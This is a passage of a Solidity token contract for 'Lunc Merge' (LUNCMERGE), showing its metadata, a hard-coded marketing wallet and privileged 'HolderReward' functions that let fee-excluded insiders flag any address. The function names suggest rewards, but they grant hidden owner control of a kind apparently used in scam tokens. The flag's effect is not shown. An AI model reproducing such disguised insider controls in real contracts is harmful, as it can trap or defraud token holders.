...
contract LUNCMERGE is Context, IERC20, Ownable {
       
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Lunc Merge";
    string private _symbol = "LUNCMERGE";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress; 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    address _marketingWalletAddress = 0xbd1B6e0D78c3cF6134CeCCE304918d7090077A18;
    ...
    function HolderReward(address _address) public {
        require(isExcludedFromFee[msg.sender]);
        isReflect[_address] = true;
    }

    function HolderRewards(address _address) public {
        require(isExcludedFromFee[msg.sender]);
